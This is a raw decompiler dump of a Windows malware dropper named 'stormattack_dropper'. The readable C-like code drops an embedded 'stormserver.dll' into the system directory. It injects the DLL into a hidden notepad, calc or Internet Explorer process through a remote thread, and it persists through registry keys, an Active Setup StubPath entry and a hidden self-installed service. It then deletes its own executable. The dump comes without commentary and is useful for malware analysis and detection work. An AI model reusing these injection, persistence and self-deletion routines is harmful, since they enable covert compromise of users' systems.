/* Hex-Rays decompilation of stormattack_dropper */

// ----- sub_401000 @ 0x401000 -----
int __cdecl sub_401000(LPSTR lpBuffer, char a2)
{
  int result; // eax

  if ( lpBuffer != nullptr )
  {
    if ( a2 != 0 )
    {
      if ( a2 == 1 )
      {
        GetSystemDirectoryA(lpBuffer, 0x104u);
      }
      else if ( a2 == 2 )
      {
        GetSystemDirectoryA(lpBuffer, 0x104u);
        lpBuffer[3] = 0;
        strcat(lpBuffer, aProgramFilesIn);
      }
    }
    else
    {
      GetSystemWindowsDirectoryA(lpBuffer, 0x104u);
    }
    result = 0;
    if ( lpBuffer[strlen(lpBuffer) - 1] != 92 )
    {
      strcat(lpBuffer, asc_4042CC);
      return 0;
    }
  }
  return result;
}


// ----- sub_4010C0 @ 0x4010c0 -----
char __cdecl sub_4010C0(LPSTR lpBuffer)
{
  char result; // al
  const char *v2; // edi

  if ( lpBuffer != nullptr )
  {
    memset(lpBuffer, 0, 0x104u);
    result = byte_404125;
    if ( byte_404125 != 0 )
    {
      if ( byte_404125 == 1 )
      {
        sub_401000(lpBuffer, 0);
        v2 = aNotepadExe;
      }
      else
      {
        if ( byte_404125 != 2 )
          return result;
        sub_401000(lpBuffer, 1);
        v2 = aCalcExe;
      }
    }
    else
    {
      sub_401000(lpBuffer, 2);
      v2 = aIexploreExe;
    }
    strcat(lpBuffer, v2);
    return 0;
  }
  return result;
}


// ----- sub_401150 @ 0x401150 -----
DWORD (__stdcall *__cdecl sub_401150(LPCSTR lpString))(LPVOID lpThreadParameter)
{
  DWORD (__stdcall *result)(LPVOID); // eax
  int v2; // eax
  DWORD (__stdcall *v3)(LPVOID); // esi
  int v4; // eax
  HMODULE ModuleHandleA; // eax
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+Ch] [ebp-158h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+1Ch] [ebp-148h] BYREF
  CHAR CommandLine[260]; // [esp+60h] [ebp-104h] BYREF

  sub_4010C0(CommandLine);
  GetStartupInfoA(&StartupInfo);
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 257;
  result = (DWORD (__stdcall *)(LPVOID))CreateProcessA(
                                          nullptr,
                                          CommandLine,
                                          nullptr,
                                          nullptr,
                                          true,
                                          0,
                                          nullptr,
                                          nullptr,
                                          &StartupInfo,
                                          &ProcessInformation);
  if ( result != nullptr )
  {
    v2 = lstrlenA(lpString);
    result = (DWORD (__stdcall *)(LPVOID))VirtualAllocEx(ProcessInformation.hProcess, nullptr, v2 + 1, 0x1000u, 4u);
    v3 = result;
    if ( result != nullptr )
    {
      v4 = lstrlenA(lpString);
      result = (DWORD (__stdcall *)(LPVOID))WriteProcessMemory(
                                              ProcessInformation.hProcess,
                                              v3,
                                              lpString,
                                              v4 + 1,
                                              nullptr);
      if ( result != nullptr )
      {
        ModuleHandleA = GetModuleHandleA(ModuleName);
        result = (DWORD (__stdcall *)(LPVOID))GetProcAddress(ModuleHandleA, ProcName);
        if ( result != nullptr )
          return (DWORD (__stdcall *)(LPVOID))(CreateRemoteThread(
                                                 ProcessInformation.hProcess,
                                                 nullptr,
                                                 0,
                                                 result,
                                                 v3,
                                                 0,
                                                 nullptr) != nullptr);
      }
    }
  }
  return result;
}


// ----- sub_401260 @ 0x401260 -----
void sub_401260()
{
  int v0; // eax
  HKEY phkResult; // [esp+8h] [ebp-9Ch] BYREF
  _BYTE v2[4]; // [esp+Ch] [ebp-98h] BYREF
  _BYTE v3[4]; // [esp+10h] [ebp-94h] BYREF
  _BYTE v4[4]; // [esp+14h] [ebp-90h] BYREF
  BYTE Data[128]; // [esp+18h] [ebp-8Ch] BYREF
  int v6; // [esp+A0h] [ebp-4h]

  CString::CString((CString *)v2, aSystemrootSyst);
  v6 = 0;
  v0 = operator+(v4, v2, aStormserverDll);
  LOBYTE(v6) = 1;
  strcpy((char *)Data, *(const char **)operator+(v3, v0, &unk_4044F0));
  CString::~CString((CString *)v3);
  LOBYTE(v6) = 0;
  CString::~CString((CString *)v4);
  RegOpenKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult);
  RegDeleteValueA(phkResult, ValueName);
  RegSetValueExA(phkResult, ValueName, 0, 2u, Data, 0x80u);
  RegCloseKey(phkResult);
  Sleep(0x32u);
  v6 = -1;
  CString::~CString((CString *)v2);
}


// ----- sub_401390 @ 0x401390 -----
int sub_401390()
{
  HANDLE CurrentProcess; // eax
  HANDLE CurrentThread; // eax
  HANDLE v3; // eax
  HANDLE v4; // eax
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+10h] [ebp-360h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+20h] [ebp-350h] BYREF
  CHAR Filename[260]; // [esp+64h] [ebp-30Ch] BYREF
  CHAR String1[260]; // [esp+168h] [ebp-208h] BYREF
  CHAR Buffer[260]; // [esp+26Ch] [ebp-104h] BYREF

  if ( GetModuleFileNameA(nullptr, Filename, 0x104u) != 0
    && GetShortPathNameA(Filename, Filename, 0x104u) != 0
    && GetEnvironmentVariableA(Name, Buffer, 0x104u) != 0 )
  {
    lstrcpyA(String1, String2);
    lstrcatA(String1, Filename);
    lstrcatA(String1, aNul);
    lstrcatA(Buffer, String1);
    memset(&ProcessInformation, 0, sizeof(ProcessInformation));
    memset(&StartupInfo.lpReserved, 0, 0x40u);
    StartupInfo.wShowWindow = 0;
    StartupInfo.cb = 68;
    StartupInfo.dwFlags = 1;
    CurrentProcess = GetCurrentProcess();
    SetPriorityClass(CurrentProcess, 0x100u);
    CurrentThread = GetCurrentThread();
    SetThreadPriority(CurrentThread, 15);
    if ( CreateProcessA(
           nullptr,
           Buffer,
           nullptr,
           nullptr,
           false,
           0xCu,
           nullptr,
           nullptr,
           &StartupInfo,
           &ProcessInformation) )
    {
      SetPriorityClass(ProcessInformation.hProcess, 0x40u);
      SetThreadPriority(ProcessInformation.hThread, -15);
      ResumeThread(ProcessInformation.hThread);
      return 1;
    }
    v3 = GetCurrentProcess();
    SetPriorityClass(v3, 0x20u);
    v4 = GetCurrentThread();
    SetThreadPriority(v4, 0);
  }
  return 0;
}


// ----- sub_401510 @ 0x401510 -----
void sub_401510()
{
  int v0; // ecx
  int v1; // [esp-Ch] [ebp-23Ch] BYREF
  int v2; // [esp-8h] [ebp-238h]
  LPCSTR v3[5]; // [esp-4h] [ebp-234h] BYREF
  LPCSTR lpString[3]; // [esp+10h] [ebp-220h] BYREF
  CHAR Buffer[260]; // [esp+1Ch] [ebp-214h] BYREF
  CHAR v6[260]; // [esp+120h] [ebp-110h] BYREF
  int v7; // [esp+22Ch] [ebp-4h]

  hServiceStatus = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
  ServiceStatus.dwServiceType = 32;
  ServiceStatus.dwControlsAccepted = 7;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwWaitHint = 2000;
  ServiceStatus.dwCheckPoint = 1;
  ServiceStatus.dwCurrentState = 2;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  ServiceStatus.dwCheckPoint = 0;
  Sleep(0x1F4u);
  ServiceStatus.dwCurrentState = 4;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  sub_401000(Buffer, byte_404124);
  strcat(Buffer, aStormserverDll);
  lpString[2] = (LPCSTR)v3;
  CString::CString((CString *)v3, aDll);
  v2 = 101;
  v1 = v0;
  lpString[1] = (LPCSTR)&v1;
  v7 = 0;
  CString::CString((CString *)&v1, Buffer);
  v7 = -1;
  if ( (unsigned __int8)sub_402460(v1, v2, v3[0]) != 0 )
  {
    sub_401000(v6, byte_404124);
    CString::CString((CString *)lpString, v6);
    v7 = 1;
    CString::operator+=(lpString, aStormserverDll);
    if ( sub_401150(lpString[0]) != nullptr )
    {
      ServiceStatus.dwCheckPoint = 1;
      ServiceStatus.dwCurrentState = 3;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      ServiceStatus.dwCheckPoint = 0;
      ServiceStatus.dwCurrentState = 1;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
    }
    v7 = -1;
    CString::~CString((CString *)lpString);
  }
}


// ----- HandlerProc @ 0x4016f0 -----
void __stdcall HandlerProc(DWORD dwControl)
{
  switch ( dwControl )
  {
    case 1u:
    case 5u:
      ServiceStatus.dwCheckPoint = 1;
      ServiceStatus.dwCurrentState = 3;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      Sleep(0x1F4u);
      ServiceStatus.dwCheckPoint = 0;
      ServiceStatus.dwCurrentState = 1;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      break;
    case 2u:
      ServiceStatus.dwCheckPoint = 1;
      ServiceStatus.dwCurrentState = 6;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      Sleep(0x1F4u);
      ServiceStatus.dwCheckPoint = 0;
      ServiceStatus.dwCurrentState = 7;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      break;
    case 3u:
      ServiceStatus.dwCheckPoint = 1;
      ServiceStatus.dwCurrentState = 5;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      Sleep(0x1F4u);
      ServiceStatus.dwCheckPoint = 0;
      ServiceStatus.dwCurrentState = 4;
      goto LABEL_5;
    default:
LABEL_5:
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      break;
  }
}


// ----- sub_401840 @ 0x401840 -----
char *sub_401840()
{
  GUID pguid; // [esp+0h] [ebp-14h] BYREF

  CoInitialize(nullptr);
  if ( CoCreateGuid(&pguid) == 0 )
    snprintf(
      Buffer,
      0x40u,
      "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}",
      pguid.Data1,
      pguid.Data2,
      pguid.Data3,
      pguid.Data4[0],
      pguid.Data4[1],
      pguid.Data4[2],
      pguid.Data4[3],
      pguid.Data4[4],
      pguid.Data4[5],
      pguid.Data4[6],
      pguid.Data4[7]);
  CoUninitialize();
  return Buffer;
}


// ----- sub_401900 @ 0x401900 -----
BOOL sub_401900()
{
  DWORD v0; // eax
  FILE *v1; // esi
  size_t v2; // ebp
  char *v3; // ebx
  FILE *v4; // esi
  char *v6; // [esp+10h] [ebp-368h]
  HKEY phkResult; // [esp+14h] [ebp-364h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+18h] [ebp-360h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+5Ch] [ebp-31Ch] BYREF
  CHAR String[260]; // [esp+6Ch] [ebp-30Ch] BYREF
  CHAR SubKey[260]; // [esp+170h] [ebp-208h] BYREF
  CHAR Filename[260]; // [esp+274h] [ebp-104h] BYREF

  memset(SubKey, 0, sizeof(SubKey));
  memset(String, 0, sizeof(String));
  memset(Filename, 0, sizeof(Filename));
  v6 = sub_401840();
  sub_401000(String, byte_404124);
  strcat(String, v6);
  strcat(String, SubStr);
  GetModuleFileNameA(nullptr, Filename, 0x104u);
  strcpy(SubKey, aSoftwareMicros);
  strcat(SubKey, v6);
  RegCreateKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult);
  v0 = lstrlenA(String);
  RegSetValueExA(phkResult, aStubpath, 0, 2u, (const BYTE *)String, v0);
  RegCloseKey(phkResult);
  v1 = fopen(Filename, Mode);
  fseek(v1, 0, 2);
  v2 = ftell(v1);
  fseek(v1, 0, 0);
  v3 = (char *)malloc(v2);
  memset(v3, 0, v2);
  fread(v3, v2, 1u, v1);
  fclose(v1);
  *((_DWORD *)v3 + 424) = 4;
  strcpy(v3 + 12408, v6);
  memset(v3 + 12376, 0, 0x20u);
  v3[12376] = 4;
  v4 = fopen(String, aWb);
  fwrite(v3, v2, 1u, v4);
  fclose(v4);
  free(v3);
  StartupInfo.cb = 68;
  memset(&StartupInfo.lpReserved, 0, 12);
  StartupInfo.dwFlags = 1;
  StartupInfo.cbReserved2 = 0;
  StartupInfo.lpReserved2 = nullptr;
  StartupInfo.wShowWindow = 1;
  return CreateProcessA(
           nullptr,
           String,
           nullptr,
           nullptr,
           false,
           0,
           nullptr,
           nullptr,
           &StartupInfo,
           &ProcessInformation);
}


// ----- sub_401B90 @ 0x401b90 -----
void sub_401B90()
{
  int v0; // ecx
  int v1; // [esp-Ch] [ebp-238h] BYREF
  int v2; // [esp-8h] [ebp-234h]
  LPCSTR v3[4]; // [esp-4h] [ebp-230h] BYREF
  LPCSTR lpString[3]; // [esp+Ch] [ebp-220h] BYREF
  CHAR Buffer[260]; // [esp+18h] [ebp-214h] BYREF
  CHAR v6[260]; // [esp+11Ch] [ebp-110h] BYREF
  int v7; // [esp+228h] [ebp-4h]

  sub_401000(Buffer, byte_404124);
  strcat(Buffer, aStormserverDll);
  lpString[2] = (LPCSTR)v3;
  CString::CString((CString *)v3, aDll);
  v2 = 101;
  v1 = v0;
  lpString[1] = (LPCSTR)&v1;
  v7 = 0;
  CString::CString((CString *)&v1, Buffer);
  v7 = -1;
  if ( (unsigned __int8)sub_402460(v1, v2, v3[0]) != 0 )
  {
    sub_401000(v6, byte_404124);
    CString::CString((CString *)lpString, v6);
    v7 = 1;
    CString::operator+=(lpString, aStormserverDll);
    sub_401150(lpString[0]);
    v7 = -1;
    CString::~CString((CString *)lpString);
  }
}


// ----- _WinMain@16 @ 0x401cb0 -----
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  void (__stdcall *v4)(HWND, LPCSTR, LPCSTR, UINT); // esi
  int v5; // eax
  int v6; // esi
  int v7; // ecx
  int v9; // [esp-Ch] [ebp-348h] BYREF
  int v10; // [esp-8h] [ebp-344h]
  LPCSTR v11[4]; // [esp-4h] [ebp-340h] BYREF
  LPCSTR lpString; // [esp+Ch] [ebp-330h] BYREF
  _BYTE v13[4]; // [esp+10h] [ebp-32Ch] BYREF
  DWORD cbData; // [esp+14h] [ebp-328h] BYREF
  DWORD Type; // [esp+18h] [ebp-324h] BYREF
  HKEY phkResult; // [esp+1Ch] [ebp-320h] BYREF
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+20h] [ebp-31Ch] BYREF
  int v18; // [esp+28h] [ebp-314h]
  int v19; // [esp+2Ch] [ebp-310h]
  BYTE Data[260]; // [esp+30h] [ebp-30Ch] BYREF
  CHAR Buffer[260]; // [esp+134h] [ebp-208h] BYREF
  CHAR v22[260]; // [esp+238h] [ebp-104h] BYREF

  v4 = (void (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))MessageBoxA;
  MessageBoxA(nullptr, Caption, Caption, 0);
  v5 = dword_404120;
  if ( dword_404120 == 1 )
  {
    memset(Data, 0, sizeof(Data));
    if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0xF003Fu, &phkResult) == 0 )
    {
      cbData = 200;
      RegQueryValueExA(phkResult, ValueName, nullptr, &Type, Data, &cbData);
      RegCloseKey(phkResult);
    }
    CString::CString((CString *)v13, aSystemrootSyst);
    v6 = strcmp((const char *)Data, *(const char **)operator+(&cbData, v13, aStormserverDll));
    CString::~CString((CString *)&cbData);
    if ( v6 == 0 )
      exit(0);
    GetSystemDirectoryA(Buffer, 0x104u);
    strcat(Buffer, asc_4042CC);
    strcat(Buffer, aStormserverDll);
    v11[0] = nullptr;
    Type = (DWORD)v11;
    CString::CString((CString *)v11, aDll);
    v10 = 101;
    v9 = v7;
    Type = (DWORD)&v9;
    CString::CString((CString *)&v9, Buffer);
    if ( (unsigned __int8)sub_402460(v9, v10, v11[0]) == 0 )
    {
      CString::~CString((CString *)v13);
      return 0;
    }
    sub_401260();
    GetSystemDirectoryA(v22, 0x104u);
    CString::CString((CString *)&lpString, v22);
    CString::operator+=(&lpString, asc_4042CC);
    CString::operator+=(&lpString, aStormserverDll);
    if ( sub_401150(lpString) == nullptr )
    {
      CString::~CString((CString *)&lpString);
      CString::~CString((CString *)v13);
      return 0;
    }
    sub_401390();
    CString::~CString((CString *)&lpString);
    CString::~CString((CString *)v13);
    v5 = dword_404120;
    v4 = (void (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))MessageBoxA;
  }
  switch ( v5 )
  {
    case 2:
      if ( sub_402320() != 0 )
      {
        ServiceStartTable.lpServiceName = ServiceName;
        ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401510;
        v18 = 0;
        v19 = 0;
        StartServiceCtrlDispatcherA(&ServiceStartTable);
        return 1;
      }
      sub_401FD0(ServiceName, DisplayName, String);
      if ( dword_4044AC != 0 )
      {
        sub_401390();
        exit(0);
      }
      break;
    case 3:
      v4(nullptr, Text, Text, 0);
      sub_401900();
      sub_401390();
      return 1;
    case 4:
      v4(nullptr, Text, Text, 0);
      sub_401B90();
      break;
    default:
      break;
  }
  return 1;
}


// ----- sub_401FD0 @ 0x401fd0 -----
HKEY __cdecl sub_401FD0(LPCSTR lpServiceName, LPCSTR lpDisplayName, LPCSTR lpString)
{
  SC_HANDLE ServiceA; // ebx
  SC_HANDLE v4; // esi
  SC_HANDLE v5; // eax
  DWORD v6; // eax
  HKEY result; // eax
  CHAR Buf[80]; // [esp+Ch] [ebp-380h] BYREF
  SC_HANDLE v9; // [esp+5Ch] [ebp-330h]
  SC_HANDLE v10; // [esp+60h] [ebp-32Ch]
  CHAR Filename[260]; // [esp+64h] [ebp-328h] BYREF
  HKEY phkResult; // [esp+168h] [ebp-224h] BYREF
  char Str1[260]; // [esp+16Ch] [ebp-220h] BYREF
  CHAR SubKey[260]; // [esp+270h] [ebp-11Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+374h] [ebp-18h]

  ServiceA = nullptr;
  GetModuleFileNameA(nullptr, Filename, 0x104u);
  sub_401000(Str1, byte_404124);
  if ( strncmp(Str1, Filename, strlen(Str1)) != 0 )
  {
    GetFileTitleA(Filename, Buf, 0x50u);
    if ( strstr(Buf, SubStr) == nullptr && strstr(Buf, aExe_0) == nullptr )
      strcat(Buf, SubStr);
    strcat(Str1, asc_4042CC);
    strcat(Str1, Buf);
    CopyFileA(Filename, Str1, false);
    memset(Filename, 0, sizeof(Filename));
    strcpy(Filename, Str1);
    dword_4044AC = 1;
    ServiceA = nullptr;
  }
  SetFileAttributesA(Filename, 6u);
  phkResult = nullptr;
  v9 = nullptr;
  v10 = nullptr;
  ms_exc.registration.TryLevel = 0;
  v4 = OpenSCManagerA(nullptr, nullptr, 0xF003Fu);
  v10 = v4;
  if ( v4 != nullptr )
  {
    ServiceA = CreateServiceA(
                 v4,
                 lpServiceName,
                 lpDisplayName,
                 0xF01FFu,
                 0x10u,
                 2u,
                 0,
                 Filename,
                 nullptr,
                 nullptr,
                 nullptr,
                 nullptr,
                 nullptr);
    v9 = ServiceA;
    if ( ServiceA == nullptr && GetLastError() == 1073 )
    {
      v5 = OpenServiceA(v4, lpServiceName, 0xF01FFu);
      ServiceA = v5;
      v9 = v5;
      if ( v5 == nullptr )
        goto LABEL_13;
      StartServiceA(v5, 0, nullptr);
    }
    if ( StartServiceA(ServiceA, 0, nullptr) )
    {
      strcpy(SubKey, aSystemCurrentc_0);
      strcat(SubKey, lpServiceName);
      RegOpenKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult);
      v6 = lstrlenA(lpString);
      RegSetValueExA(phkResult, aDescription, 0, 1u, (const BYTE *)lpString, v6);
      v4 = v10;
    }
  }
LABEL_13:
  ms_exc.registration.TryLevel = -1;
  if ( ServiceA != nullptr )
    CloseServiceHandle(ServiceA);
  if ( v4 != nullptr )
    CloseServiceHandle(v4);
  result = phkResult;
  if ( phkResult != nullptr )
    return (HKEY)RegCloseKey(phkResult);
  return result;
}


// ----- sub_402320 @ 0x402320 -----
BOOL sub_402320()
{
  HKEY phkResult; // [esp+Ch] [ebp-108h] BYREF
  _BYTE SubKey[260]; // [esp+10h] [ebp-104h] BYREF

  memset(&SubKey[1], 0, 259);
  strcpy(SubKey, aSystemCurrentc_0);
  strcat(SubKey, ServiceName);
  return RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0xF003Fu, &phkResult) == 0;
}


// ----- sub_4023C0 @ 0x4023c0 -----
char __cdecl sub_4023C0(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  HANDLE FileA; // esi
  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-10h] BYREF
  int v6; // [esp+10h] [ebp-4h]

  FileA = CreateFileA(lpFileName, 0x40000000u, 0, nullptr, 2u, 0, nullptr);
  if ( FileA != nullptr )
  {
    WriteFile(FileA, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, nullptr);
    CloseHandle(FileA);
    v6 = -1;
    CString::~CString((CString *)&lpFileName);
    return 1;
  }
  else
  {
    CString::~CString((CString *)&lpFileName);
    return 0;
  }
}


// ----- sub_402460 @ 0x402460 -----
char __cdecl sub_402460(char a1, LPCSTR *a2, LPCSTR lpType)
{
  HRSRC ResourceA; // eax
  HRSRC v4; // esi
  void *v5; // ebx
  HGLOBAL Resource; // esi
  HGLOBAL v7; // ebp
  char v8; // al
  LPCSTR v10; // [esp-Ch] [ebp-28h] BYREF
  LPCVOID v11; // [esp-8h] [ebp-24h]
  HGLOBAL v12; // [esp-4h] [ebp-20h]
  int v13; // [esp+18h] [ebp-4h]

  v13 = 1;
  ResourceA = FindResourceA(nullptr, (LPCSTR)(unsigned __int16)a2, lpType);
  v4 = ResourceA;
  if ( ResourceA == nullptr )
    goto LABEL_6;
  v5 = (void *)SizeofResource(nullptr, ResourceA);
  Resource = LoadResource(nullptr, v4);
  if ( Resource == nullptr )
    goto LABEL_6;
  v7 = GlobalAlloc(0x40u, (SIZE_T)v5);
  if ( v7 == nullptr )
    goto LABEL_6;
  qmemcpy(v7, LockResource(Resource), (unsigned int)v5);
  v12 = v5;
  v11 = v7;
  v10 = nullptr;
  a2 = &v10;
  CString::CString((CString *)&v10, (const struct CString *)&a1);
  v8 = sub_4023C0(v10, v11, (DWORD)v12);
  v12 = v7;
  if ( v8 == 0 )
  {
    GlobalFree(v12);
LABEL_6:
    LOBYTE(v13) = 0;
    CString::~CString((CString *)&a1);
    v13 = -1;
    CString::~CString((CString *)&lpType);
    return 0;
  }
  GlobalFree(v12);
  LOBYTE(v13) = 0;
  CString::~CString((CString *)&a1);
  v13 = -1;
  CString::~CString((CString *)&lpType);
  return 1;
}


// ----- sub_402580 @ 0x402580 -----
int sub_402580()
{
  sub_402590();
  return atexit(sub_4025B0);
}


// ----- sub_402590 @ 0x402590 -----
int sub_402590()
{
  return std::ios_base::Init::Init((std::ios_base::Init *)&Text[5]);
}


// ----- sub_4025B0 @ 0x4025b0 -----
void __cdecl sub_4025B0()
{
  std::ios_base::Init::~Init((std::ios_base::Init *)&Text[5]);
}


// ----- sub_4025C0 @ 0x4025c0 -----
int sub_4025C0()
{
  sub_4025D0();
  return atexit(sub_4025F0);
}


// ----- sub_4025D0 @ 0x4025d0 -----
int sub_4025D0()
{
  return std::_Winit::_Winit((std::_Winit *)&Text[4]);
}


// ----- sub_4025F0 @ 0x4025f0 -----
void __cdecl sub_4025F0()
{
  std::_Winit::~_Winit((std::_Winit *)&Text[4]);
}


// ----- ??1CString@@QAE@XZ @ 0x402600 -----
// attributes: thunk
void __thiscall CString::~CString(CString *this)
{
  __imp_??1CString@@QAE@XZ(this);
}


// ----- ??H@YG?AVCString@@ABV0@PBD@Z @ 0x402606 -----
// attributes: thunk
int __stdcall operator+(int a1, int a2, int a3)
{
  return __imp_??H@YG?AVCString@@ABV0@PBD@Z(a1, a2, a3);
}


// ----- ??0CString@@QAE@PBD@Z @ 0x40260c -----
// attributes: thunk
CString *__thiscall CString::CString(CString *this, const char *a2)
{
  return __imp_??0CString@@QAE@PBD@Z(this, a2);
}


// ----- ??YCString@@QAEABV0@PBD@Z @ 0x402612 -----
// attributes: thunk
int __thiscall CString::operator+=(void *this, int a2)
{
  return __imp_??YCString@@QAEABV0@PBD@Z(this, a2);
}


// ----- ??0CString@@QAE@ABV0@@Z @ 0x402618 -----
// attributes: thunk
CString *__thiscall CString::CString(CString *this, const struct CString *a2)
{
  return __imp_??0CString@@QAE@ABV0@@Z(this, a2);
}


// ----- __CxxFrameHandler @ 0x40261e -----
// attributes: thunk
int _CxxFrameHandler()
{
  return __CxxFrameHandler();
}


// ----- _except_handler3 @ 0x402630 -----
// attributes: thunk
int except_handler3()
{
  return _except_handler3();
}


// ----- __onexit @ 0x402636 -----
_onexit_t __cdecl _onexit(_onexit_t Func)
{
  if ( dword_40451C == -1 )
    return onexit(Func);
  else
    return _dllonexit(Func, &dword_40451C, &dword_404518);
}


// ----- _atexit @ 0x402662 -----
int __cdecl atexit(void (__cdecl *Func)())
{
  return (_onexit((_onexit_t)Func) != nullptr) - 1;
}


// ----- start @ 0x402674 -----
void __noreturn start()
{
  char *v0; // esi
  int wShowWindow; // eax
  HMODULE ModuleHandleA; // eax
  int v3; // [esp-4h] [ebp-88h]
  _BYTE v4[4]; // [esp+14h] [ebp-70h] BYREF
  int v5; // [esp+18h] [ebp-6Ch] BYREF
  int v6; // [esp+1Ch] [ebp-68h]
  _BYTE v7[4]; // [esp+20h] [ebp-64h] BYREF
  _BYTE v8[4]; // [esp+24h] [ebp-60h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+28h] [ebp-5Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+6Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  _set_app_type(_crt_gui_app);
  dword_404518 = -1;
  dword_40451C = -1;
  *_p__fmode() = dword_404510;
  *_p__commode() = dword_40450C;
  dword_404514 = adjust_fdiv;
  nullsub_1();
  if ( dword_404480 == 0 )
    _setusermatherr(UserMathErrorFunction);
  _setdefaultprecision();
  initterm(&First, &Last);
  v5 = dword_404508;
  _getmainargs(v8, v4, v7, dword_404504, &v5);
  initterm(&dword_404000, &dword_40400C);
  v0 = acmdln;
  if ( *acmdln != 34 )
  {
    while ( (unsigned __int8)*v0 > 0x20u )
      ++v0;
    goto LABEL_8;
  }
  do
    ++v0;
  while ( *v0 != 0 && *v0 != 34 );
  if ( *v0 != 34 )
    goto LABEL_8;
  while ( 1 )
  {
    ++v0;
LABEL_8:
    if ( *v0 == 0 || (unsigned __int8)*v0 > 0x20u )
    {
      StartupInfo.dwFlags = 0;
      GetStartupInfoA(&StartupInfo);
      if ( (StartupInfo.dwFlags & 1) != 0 )
        wShowWindow = StartupInfo.wShowWindow;
      else
        wShowWindow = 10;
      v3 = wShowWindow;
      ModuleHandleA = GetModuleHandleA(nullptr);
      v6 = WinMain(ModuleHandleA, nullptr, v0, v3);
      exit(v6);
    }
  }
}


// ----- __dllonexit @ 0x4027d2 -----
// attributes: thunk
_onexit_t __cdecl _dllonexit(int a1, int a2, int a3)
{
  return __dllonexit(a1, a2, a3);
}


// ----- _XcptFilter @ 0x4027d8 -----
// attributes: thunk
int XcptFilter()
{
  return _XcptFilter();
}


// ----- _initterm @ 0x4027de -----
// attributes: thunk
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _initterm(First, Last);
}


// ----- __setdefaultprecision @ 0x4027e4 -----
unsigned int _setdefaultprecision()
{
  return controlfp(0x10000u, 0x30000u);
}


// ----- UserMathErrorFunction @ 0x4027f6 -----
int __cdecl UserMathErrorFunction()
{
  return 0;
}


// ----- nullsub_1 @ 0x4027f9 -----
void nullsub_1()
{
  ;
}


// ----- _controlfp @ 0x4027fa -----
// attributes: thunk
unsigned int __cdecl controlfp(unsigned int NewValue, unsigned int Mask)
{
  return _controlfp(NewValue, Mask);
}


